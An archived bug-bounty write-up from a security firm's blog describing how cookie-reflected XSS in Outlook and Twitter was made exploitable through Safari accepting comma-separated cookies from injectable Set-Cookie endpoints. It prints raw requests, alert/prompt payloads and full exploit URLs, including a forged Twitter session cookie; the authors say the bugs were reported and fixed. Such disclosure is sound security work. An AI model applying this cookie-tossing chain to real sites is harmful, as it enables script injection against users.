---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-07-10_xss-by-tossing-cookies.md
original_filename: 2017-07-10_xss-by-tossing-cookies.md
title: XSS by tossing cookies
category: documents
detected_topics:
- xss
- cloud-security
- mobile-security
- oauth
- sso
- access-control
tags:
- imported
- documents
- xss
- cloud-security
- mobile-security
- oauth
- sso
- access-control
language: en
raw_sha256: 0168c5d23c3d7ebd680089fc36999eec0592734e44659b69b1c280be57349bba
text_sha256: 9e730089278d56140ba4a65a80a606db19eaf86d194c6548a53fc5bf60eacedc
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# XSS by tossing cookies

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-07-10_xss-by-tossing-cookies.md
- Source Type: markdown
- Detected Topics: xss, cloud-security, mobile-security, oauth, sso, access-control
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `0168c5d23c3d7ebd680089fc36999eec0592734e44659b69b1c280be57349bba`
- Text SHA256: `9e730089278d56140ba4a65a80a606db19eaf86d194c6548a53fc5bf60eacedc`


## Content

---
title: "XSS by tossing cookies"
page_title: "XSS by Tossing Cookies - WeSecureApp :: Simplifying Enterprise Security"
url: "https://wesecureapp.com/blog/xss-by-tossing-cookies/"
final_url: "https://wesecureapp.com/blog/xss-by-tossing-cookies/"
authors: ["WeSecureApp (@wesecureapp)"]
programs: ["Microsoft", "Twitter"]
bugs: ["XSS", "Cookie tossing"]
publication_date: "2017-07-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6159
---

[](javascript:;)

  * [Home](https://wesecureapp.com/)
  * [Services](https://wesecureapp.com/services/)
  * [Application Security](https://wesecureapp.com/services/application-security/)
  * [Web Application VAPT](https://wesecureapp.com/vulnerability-assessment-and-penetration-testing/)
  * [Mobile Application Pentesting](https://wesecureapp.com/services/application-security/mobile-app-pentest/)
  * [Web Services & API Assessment](https://wesecureapp.com/services/application-security/web-services-api-assessment/)
  * [Threat Modeling](https://wesecureapp.com/services/application-security/threat-modeling/)
  * [Secure Code Review](https://wesecureapp.com/services/application-security/secure-code-review/)
  * [Application Architecture Review](https://wesecureapp.com/services/application-security/application-architecture-review/)
  * [Network Security](https://wesecureapp.com/services/network-security/)
  * [Network Vulnerability Assessment and Penetration Testing](https://wesecureapp.com/services/network-security/network-vapt/)
  * [Device Security](https://wesecureapp.com/services/network-security/device-security/)
  * [VoIP Vulnerability Assessment & Penetration Testing](https://wesecureapp.com/services/network-security/voip-pentesting/)
  * [Wireless Penetration Testing](https://wesecureapp.com/services/network-security/wireless-pentesting/)
  * [Cloud Security](https://wesecureapp.com/services/cloud-security/)
  * [Cloud Auditing](https://wesecureapp.com/services/cloud-security/cloud-auditing/)
  * [Cloud Pentesting](https://wesecureapp.com/services/cloud-security/cloud-pentesting/)
  * [Breach & Attack Simulation](https://wesecureapp.com/services/breach-attack-simulation/)
  * [Red Team Assessment](https://wesecureapp.com/services/breach-attack-simulation/red-team-assessment/)
  * [Dark Web Monitoring](https://wesecureapp.com/services/breach-attack-simulation/dark-web-monitoring/)
  * [Ransomware Simulation](https://wesecureapp.com/services/breach-attack-simulation/ransomware-simulation/)
  * [Social Engineering](https://wesecureapp.com/services/breach-attack-simulation/social-engineering/)
  * [Assumed Breach](https://wesecureapp.com/services/breach-attack-simulation/assumed-breach/)
  * [Staffing Services](https://wesecureapp.com/services/staffing-services/)
  * [Smart Shore Sourcing](https://wesecureapp.com/services/staffing-services/smart-shore-sourcing/)
  * [Virtual CISO](https://wesecureapp.com/services/staffing-services/virtual-ciso/)
  * [Solutions](https://wesecureapp.com/solutions/)
  * [Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)
  * [Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)
  * [Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)
  * [DevsecOps](https://wesecureapp.com/footer/devsecops-themepage/)
  * [Strategic Security Solutions](https://wesecureapp.com/solutions/strategic-security-solutions/)
  * Resources
  * [Blog](https://wesecureapp.com/blog/)
  * [Case studies](https://wesecureapp.com/resources/case-studies/)
  * [White Papers](https://wesecureapp.com/resources/white-papers/)
  * [Datasheets](https://wesecureapp.com/resources/datasheets/)
  * [Events](https://wesecureapp.com/resources/events/)
  * [Podcast](https://wesecureapp.com/resources/podcast/)
  * [Company](https://wesecureapp.com/company/)
  * [About us](https://wesecureapp.com/company/about-us/)
  * [Partners](https://wesecureapp.com/company/partners/)
  * [Careers](https://wesecureapp.com/?page_id=15291)
  * [Contact](https://wesecureapp.com/contact/)

[ ![WeSecureApp Logo \(2\)](https://wesecureapp.com/wp-content/uploads/2020/08/WeSecureApp-Logo-2.svg) ](https://wesecureapp.com/)

  * Services
  *  * [Application Security](/services/application-security/)
  *  * SERVICES
  * [![application security](https://wesecureapp.com/wp-content/uploads/2020/09/application.svg)Web Application Penetration Testing](https://wesecureapp.com/services/application-security/web-app-pentest/)
  * [![Mobile Application Penetration Test](https://wesecureapp.com/wp-content/uploads/2020/09/mobile_phone-1.svg)Mobile Application Pentesting](https://wesecureapp.com/services/application-security/mobile-app-pentest/)
  * [![Web Services & API Assessment](https://wesecureapp.com/wp-content/uploads/2020/09/touch-1.svg)Web Services & API Assessment](https://wesecureapp.com/services/application-security/web-services-api-assessment/)
  * [![threat-modelling](https://wesecureapp.com/wp-content/uploads/2024/03/threat-modelling.svg)Threat Modeling](https://wesecureapp.com/services/application-security/threat-modeling/)
  * [![application security - secure code review](https://wesecureapp.com/wp-content/uploads/2020/09/code-syntax-1.svg)Secure Code Review](https://wesecureapp.com/services/application-security/secure-code-review/)
  * [![application architecture review](https://wesecureapp.com/wp-content/uploads/2024/03/application-architecture-review.svg)Application Architecture Review](https://wesecureapp.com/services/application-security/application-architecture-review/)
  *  * RESOURCES
  * [ ![cyber security measures](https://wesecureapp.com/wp-content/uploads/2018/12/Web-1920-–-11-1.png) Top 7 cyber security measures that enterprises shouldn’t neglect](https://wesecureapp.com/blog/top-7-cyber-security-measures-that-enterprises-shouldnt-neglect/)
  * [Network Security](/services/network-security/)
  *  * SERVICES
  * [![network-1](https://wesecureapp.com/wp-content/uploads/2020/09/network-1-1.svg)Network Vulnerability Assessment and Penetration Testing](https://wesecureapp.com/services/network-security/network-vapt/)
  * [![Group 16753 \(1\)](https://wesecureapp.com/wp-content/uploads/2024/03/Group-16753-1.svg)Device Security](https://wesecureapp.com/services/network-security/device-security/)
  * [![telephone \(1\)](https://wesecureapp.com/wp-content/uploads/2020/09/telephone-1.svg)VoIP Vulnerability Assessment & Penetration Testing](https://wesecureapp.com/services/network-security/voip-pentesting/)
  * [![wireless_modem \(1\)](https://wesecureapp.com/wp-content/uploads/2020/09/wireless_modem-1.svg)Wireless Penetration Testing](https://wesecureapp.com/services/network-security/wireless-pentesting/)
  *  * RESOURCES
  * [![penetration testing companies in the USA](https://wesecureapp.com/wp-content/uploads/2021/07/bg.png)Top 7 Penetration Testing Companies in the USA](https://wesecureapp.com/blog/top-7-penetration-testing-companies-in-the-usa/)
  * [Cloud Security](/services/cloud-security/)
  *  * SERVICES
  * [![Aws](https://wesecureapp.com/wp-content/uploads/2020/09/Aws-1.svg)Cloud Auditing](https://wesecureapp.com/services/cloud-security/cloud-auditing/)
  * [![cloud-pentesing-icon](https://wesecureapp.com/wp-content/uploads/2024/03/cloud-pentesing-icon.svg)Cloud Pentesting](https://wesecureapp.com/services/cloud-security/cloud-pentesting/)
  *  * RESOURCES
  * [ ![Cloud Security Threats](https://wesecureapp.com/wp-content/uploads/2021/02/Cloud_Security-_Threats-1.jpg) Cloud Security Threats](https://wesecureapp.com/blog/cloud-security-threats/)
  * [Breach & Attack Simulation](/services/threat-simulation/)
  *  * SERVICES
  * [![global-security](https://wesecureapp.com/wp-content/uploads/2020/09/global-security-1.svg)Red Team Assessment](/services/threat-simulation/red-team-assessment/)
  * [![dark-web](https://wesecureapp.com/wp-content/uploads/2024/03/dark-web.svg)Dark Web Monitoring](https://wesecureapp.com/services/breach-attack-simulation/dark-web-monitoring/)
  * [![ransomware simulation](https://wesecureapp.com/wp-content/uploads/2024/03/ransomware-simulation.svg)Ransomware Simulation](https://wesecureapp.com/services/breach-attack-simulation/ransomware-simulation/)
  * [![insights-1](https://wesecureapp.com/wp-content/uploads/2020/09/insights-1-1.svg)Social Engineering Assessment](/services/threat-simulation/social-engineering/)
  * [![assume-breach-icon](https://wesecureapp.com/wp-content/uploads/2023/06/assume-breach-icon.svg)Assumed Breach](https://wesecureapp.com/services/breach-attack-simulation/assumed-breach/)
  *  * RESOURCES
  * [![Hire a Red Team](https://wesecureapp.com/wp-content/uploads/2022/01/Tinted-Bg-2-1-–-2.png)7+ Major Reasons to Hire a Red Team to Harden Your App Sec](https://wesecureapp.com/blog/7-major-reasons-to-hire-a-red-team-to-harden-your-app-sec/)
  * [Staffing Services](/services/staffing-services/)
  *  * SERVICES
  * [![smart-shore-source](https://wesecureapp.com/wp-content/uploads/2023/05/smart-shore-source.svg)Smart Shore Sourcing](https://wesecureapp.com/services-staffing-services-smart-shore-sourcing/)
  * [![virtual-ciso](https://wesecureapp.com/wp-content/uploads/2024/03/virtual-ciso.svg)Virtual CISO](https://wesecureapp.com/services/staffing-services/virtual-ciso/)
  *  * RESOURCES
  * [ ![selecting-penetrationtesting](https://wesecureapp.com/wp-content/uploads/2021/03/selecting-penetrationtesting.jpg) How to Choose a Penetration Testing Vendor Wisely?](https://wesecureapp.com/blog/selecting-a-penetration-testing-vendor/)
  * Solutions
  *  * MANAGED SECURITY
  * [![vmaas](https://wesecureapp.com/wp-content/uploads/2024/03/vmaas.svg)Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)
  * [![vraas](https://wesecureapp.com/wp-content/uploads/2024/03/vraas.svg)Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)
  * [![tiaas](https://wesecureapp.com/wp-content/uploads/2024/03/tiaas.svg)Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)
  * [![devsecops-logo](https://wesecureapp.com/wp-content/uploads/2021/04/devsecops-logo-1.svg)DevSecOps](https://wesecureapp.com/solutions/devsecops/)
  * [![SSS-logo](https://wesecureapp.com/wp-content/uploads/2021/04/SSS-logo.svg)Strategic Security Solutions](https://wesecureapp.com/solutions/strategic-security-solutions/)
  *  * RESOURCE
  * [![worst passwords](https://wesecureapp.com/wp-content/uploads/2021/06/Tinted-Bg-5-1-–-22.png)World’s Worst Passwords: Is it time to change yours?](https://wesecureapp.com/blog/worlds-worst-passwords-is-it-time-to-change-yours/)
  * Resources
  * [Blog](https://wesecureapp.com/blog/)
  * [Datasheets](/resources/datasheets/)
  * [Case Studies](/resources/case-studies/)
  * [Whitepapers](/resources/white-papers/)
  * [Podcasts](https://wesecureapp.com/resources/podcast/)
  * [Events](https://wesecureapp.com/resources/events/)
  * Company
  * [About us](https://wesecureapp.com/company/about-us/)
  * [Partners](https://wesecureapp.com/company/partners/)
  * [Contact](https://wesecureapp.com/contact/)

  * [Home](https://wesecureapp.com/)
  * [Services](https://wesecureapp.com/services/)
  * [Application Security](https://wesecureapp.com/services/application-security/)
  * [Web Application VAPT](https://wesecureapp.com/vulnerability-assessment-and-penetration-testing/)
  * [Mobile Application Pentesting](https://wesecureapp.com/services/application-security/mobile-app-pentest/)
  * [Web Services & API Assessment](https://wesecureapp.com/services/application-security/web-services-api-assessment/)
  * [Threat Modeling](https://wesecureapp.com/services/application-security/threat-modeling/)
  * [Secure Code Review](https://wesecureapp.com/services/application-security/secure-code-review/)
  * [Application Architecture Review](https://wesecureapp.com/services/application-security/application-architecture-review/)
  * [Network Security](https://wesecureapp.com/services/network-security/)
  * [Network Vulnerability Assessment and Penetration Testing](https://wesecureapp.com/services/network-security/network-vapt/)
  * [Device Security](https://wesecureapp.com/services/network-security/device-security/)
  * [VoIP Vulnerability Assessment & Penetration Testing](https://wesecureapp.com/services/network-security/voip-pentesting/)
  * [Wireless Penetration Testing](https://wesecureapp.com/services/network-security/wireless-pentesting/)
  * [Cloud Security](https://wesecureapp.com/services/cloud-security/)
  * [Cloud Auditing](https://wesecureapp.com/services/cloud-security/cloud-auditing/)
  * [Cloud Pentesting](https://wesecureapp.com/services/cloud-security/cloud-pentesting/)
  * [Breach & Attack Simulation](https://wesecureapp.com/services/breach-attack-simulation/)
  * [Red Team Assessment](https://wesecureapp.com/services/breach-attack-simulation/red-team-assessment/)
  * [Dark Web Monitoring](https://wesecureapp.com/services/breach-attack-simulation/dark-web-monitoring/)
  * [Ransomware Simulation](https://wesecureapp.com/services/breach-attack-simulation/ransomware-simulation/)
  * [Social Engineering](https://wesecureapp.com/services/breach-attack-simulation/social-engineering/)
  * [Assumed Breach](https://wesecureapp.com/services/breach-attack-simulation/assumed-breach/)
  * [Staffing Services](https://wesecureapp.com/services/staffing-services/)
  * [Smart Shore Sourcing](https://wesecureapp.com/services/staffing-services/smart-shore-sourcing/)
  * [Virtual CISO](https://wesecureapp.com/services/staffing-services/virtual-ciso/)
  * [Solutions](https://wesecureapp.com/solutions/)
  * [Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)
  * [Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)
  * [Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)
  * [DevsecOps](https://wesecureapp.com/footer/devsecops-themepage/)
  * [Strategic Security Solutions](https://wesecureapp.com/solutions/strategic-security-solutions/)
  * Resources
  * [Blog](https://wesecureapp.com/blog/)
  * [Case studies](https://wesecureapp.com/resources/case-studies/)
  * [White Papers](https://wesecureapp.com/resources/white-papers/)
  * [Datasheets](https://wesecureapp.com/resources/datasheets/)
  * [Events](https://wesecureapp.com/resources/events/)
  * [Podcast](https://wesecureapp.com/resources/podcast/)
  * [Company](https://wesecureapp.com/company/)
  * [About us](https://wesecureapp.com/company/about-us/)
  * [Partners](https://wesecureapp.com/company/partners/)
  * [Careers](https://wesecureapp.com/?page_id=15291)
  * [Contact](https://wesecureapp.com/contact/)

Hamburger Toggle Menu

[Schedule a Meeting](https://meetings.hubspot.com/strobes/wesecureapp)

[Data Privacy](https://wesecureapp.com/blog/category/data-privacy/) · [Enterprise Security](https://wesecureapp.com/blog/category/enterprise-security/) · [Write-up](https://wesecureapp.com/blog/category/write-up/)

# XSS by Tossing Cookies

By user

All cross site scripting vulnerabilities cannot be exploited easily and would need a vulnerablity chain to exploit them  
For example a **[self XSS](https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/)** that only executes in your profile, here is how whitton used minor OAuth flaws to exploit a cross site scripting in Uber  
<https://whitton.io/articles/uber-turning-self-xss-into-good-xss/>

How about a XSS that needs a lot of user interaction?  
This is how Sasi used a clicking vulnerability to succesfully exploit a xss in Google  
<http://sasi2103.blogspot.in/2016/09/combination-of-techniques-lead-to-dom.html>

What about a Cross site scripting that needs an arbitrary cookie?  
Here is how we found cross site scripting vulnerabilities in Outlook and Twitter by tossing cookies in Safari browser.

**Outlook Client Side Stored Cross Site Scripting Vulnerability**

There was a simple cross site scripting on outlook.live.com, a value from cookie was directly reflected back in the source without any filtering.

**_Request_**
  
  
  GET / HTTP/1.1  
  Host: outlook.live.com  
  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0  
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
  Accept-Language: en-US,en;q=0.5  
  Accept-Encoding: gzip, deflate, br  
  Cookie: ClientId=vulnerable<>"';  
  Connection: close  
  Upgrade-Insecure-Requests: 1
  

**_Response snippet_**
  
  
  window.dateZero = new Date(0);  
  var scriptStart = ((new Date()) - window.dateZero);  
  window.clientId = 'vulnerable<>"'';  
  

Setting the ClientId to payload ‘-alert(2)-‘ will give us a pop up but the challenge was on how to exploit the xss on other users.  
It’s possible if:

  * There is CRLF injection(chances are like 1/100)
  * There is another XSS(needs time)
  * Ability to set an Arbitrary cookie

We ruled out option one & two and started looking for 3. Luckily in next 5 minutes we found an endpoint were the application takes an user input & throws it directly into Set-cookie response headers. Now comes the fun part,  
%0a %0d were stripped out but , (comma) and ; were not.  
Ok! <https://www.ietf.org/rfc/rfc2109.txt>  
Here is how each browser reacts to a comma

**_Chrome_**  
Set-Cookie: param1=value1;,param2=value2;  
Cookie: param1=value1;

**_Firefox_**  
Set-Cookie: param1=value1;,param2=value2;  
Cookie: param1=value1;

**_Safari_**  
Set-Cookie: param1=value1;,param2=value2;  
Cookie: param1=value1; param2=value2;

Safari accepts comma delimited cookies and now we can exploit the xss on other users.  
Our final payload: [https://outlook.live.com/owa/?realm=hotmail.com%3b%2cClientId%3d’-alert(2)-](https://outlook.live.com/owa/?realm=hotmail.com%3b%2cClientId%3d'-alert\(2\)-)‘

We could also set the expiry of the cookie possibly allowing us to store our payload in the victim’s browser forever.

Oh wait we could also do cookie bombing like mentioned here: <http://blog.innerht.ml/page/7/>

**Twitter XSS by tossing cookies**

Refer(to understand on how to store flash messages and pass them to controller using cookies in ROR): <http://api.rubyonrails.org/classes/ActionDispatch/Flash.html>

While doing some reconnaissance we came across an end point were one could detach an email from his account: `https://twitter.com/account/not_my_account/`  
**_Request_**
  
  
  POST /account/detach_email HTTP/1.1  
  Host: twitter.com  
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
  Accept-Language: en-us  
  Accept-Encoding: gzip, deflate  
  Content-Type: application/x-www-form-urlencoded  
  Origin: https://twitter.com/  
  Content-Length: 36  
  Connection: keep-alive  
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4  
  Cookie: <redacted>
  
  authenticity_token=&user=sds"><img src=x onerror=prompt(1)>&secret=  
  

Setting the user parameter to payload will return a 302 redirect to a controller with a flash message in cookie.

**_Response_**
  
  
  HTTP/1.1 200 OK  
  cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0  
  connection: close  
  content-security-policy:  
  content-type: text/html;charset=utf-8  
  date: Mon, 10 Oct 2016 13:37:02 GMT  
  expires: Tue, 31 Mar 1981 05:00:00 GMT  
  last-modified: Mon, 10 Oct 2016 13:37:02 GMT  
  pragma: no-cache  
  server: tsa_a  
  set-cookie: fm=0; Expires=Mon, 10 Oct 2016 13:36:52 UTC; Path=/; Domain=.twitter.com; Secure; HTTPOnly  
  set-cookie: _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCK%252BXz65XAToMY3NyZl9p%250AZCIlZDE3ZTQxZDQ1M2I2YWViMjI2NzQ4MWExM2FjYmY1ZmU6B2lkIiU2MTM0%250AMmRmYmQxOWQ4ODFiN2JjNDMyNmQyMGI4ZjNlOQ%253D%253D--2071c49064d36eabc5121fc586c3502526a7dafd; Path=/; Domain=.twitter.com; Secure; HTTPOnly  
  set-cookie: lang=en; Path=/  
  

**__twitter_sess_** cookie has a flash message stored and will be shown in the next page after redirect. The flash message was something like this “the email address is no longer associated with payload”.  
This is a same story like outlook, to exploit the xss we needed to set an arbitrary cookie or a csrf.  
Like always we are lucky again and found an end point were a user input is directly thrown in between the set cookie response headers.

Our final payload was:  
`https://twitter.com/i/safety/report_story?next_view=report_story_start&source=reporttweet&reported_user_id=108900981&reporter_user_id=602037637&is_media=true&is_promoted=false&reported_tweet_id=723164469380018178&tweet%5B%5D=%22test%22%3b,%20_twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%25250ASGFzaHsGOgtub3RpY2VDOhdUcmFuc2xhdGFibGVTdHJpbmciblRoZSBlbWFp%25250AbCBhZGRyZXNzIGlzIG5vIGxvbmdlciBhc3NvY2lhdGVkIHdpdGggdGhlIFR3%25250AaXR0ZXIgYWNjb3VudCAodGVzdCI%25252BPGltZyBzcmM9eCBvbmVycm9yPXByb21w%25250AdCgxKT4pLgY6CkB1c2VkewY7BlQ6D2NyZWF0ZWRfYXRsKwgRECMBVAE6DGNz%25250AcmZfaWQiJTEwOWQ5ZGYxNmIzZGYyNjc1ZjgzNDY3MjA0YjlkZTI3OgdpZCIl%25250AN2M3YTdiMzJkNzBkNGM2ZjZkNTgxMmMyN2Q2M2VhZTg%25253D--b26e09e3bcf3861b841b00b2279c806126009cd0%3b%20Path=/%3b%20Domain=.twitter.com%3b,s=%22akhil`

Video POC:

Overall it was real fun for us. We have reported both the bugs to respective companies, got a bounty from Microsoft and a silent fix from twitter.

**Update:** Twitter does have CSP 2.0 in place and Safari 9.1.3 doesn’t support 2.0 hence the pop up!

  

[Cross site scripting](https://wesecureapp.com/blog/tag/cross-site-scripting/)

  

### Related Articles

  

[](https://wesecureapp.com/blog/execution-of-arbitrary-javascript-in-android-application/) ![javascript in android application](https://wesecureapp.com/wp-content/uploads/2023/10/Tinted-Bg-5-1-–-25-610x610.png)

[Application Security](https://wesecureapp.com/blog/category/application-security/) · [Cyber Security](https://wesecureapp.com/blog/category/cyber-security/) · [Write-up](https://wesecureapp.com/blog/category/write-up/)

###### [Execution of Arbitrary JavaScript in Android Application](https://wesecureapp.com/blog/execution-of-arbitrary-javascript-in-android-application/ "Execution of Arbitrary JavaScript in Android Application")

### Leave A Reply [Cancel reply](/blog/xss-by-tossing-cookies/#respond)

Your email address will not be published. Required fields are marked *

Comment

Name *

Email *

Website

Save my name, email, and website in this browser for the next time I comment.

[ ![fabric.io](https://wesecureapp.com/wp-content/uploads/2017/07/Tinted-Bg-1-–-6-610x610.png) Fabric.io API Permission Apocalypse - Privilege Escalations Previous Article  ](https://wesecureapp.com/blog/fabric-io-api-permission-apocalypse-privilege-escalations/)

[ ![](https://wesecureapp.com/wp-content/uploads/2018/05/new-1536x864-1-610x610.jpg) Persistent XSS to Steal Passwords - Paypal Next Article  ](https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/)

  

### Industries

[BFSI](/industries/banking/)

[Healthcare](/industries/healthcare/)

[Government](/industries/government/)

[Retail & eCommerce](/industries/retail-ecommerce/)

[Information Technology](/industries/information-technology)

[Telecommunications](/industries/telecommunications)

### SERVICES

[Application Security](/services/application-security/)

[Network Security](/services/network-security/)

[Cloud Security](/services/cloud-security/)

[Staffing Services](https://wesecureapp.com/services/staffing-services/)

[Threat Simulation](/services/threat-simulation/)

[CERT-In Audit Services](https://wesecureapp.com/services/cert-in-audit/)

### SOLUTIONS

[Managed Security](/solutions/enterprise-security/managed-security/)

[Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)

[Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)

[Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)

[Strategic Security Solutions](/solutions/strategic-security-solutions/)

### resources

[Blog](/blog/)

[Datasheets](/resources/datasheets/)

[Case studies](/resources/case-studies/)

[Podcasts](/resources/podcast/)

[Events](https://wesecureapp.com/resources/events/)

### company

[About](/company/about-us/)

[Partners](/company/partners/)

[CERT-InNew](/certin/)

[White papers](/resources/white-papers/)

[Contact](/contact)

[Privacy Policy](/privacy-policy)

### WE ARE CERTIFIED

[ ![trustpilot_review](https://wesecureapp.com/wp-content/uploads/2024/04/cert-inlogo.jpg) ](https://www.trustpilot.com/review/wesecureapp.com)

[ ![trustpilot_review](https://wesecureapp.com/wp-content/uploads/2024/04/img-strobes-certifications.png) ](https://www.trustpilot.com/review/wesecureapp.com)

[![trustpilot_review](https://wesecureapp.com/wp-content/uploads/2021/09/trustpilot-black.svg)](https://www.trustpilot.com/review/wesecureapp.com)

[![GoodFirms Badge](https://assets.goodfirms.co/badges/blue-button/view-profile.svg)](https://www.goodfirms.co/company/wesecureapp)

[ ![clutch_review](https://wesecureapp.com/wp-content/uploads/2021/09/clutch.png) ](https://clutch.co/review/1737852)
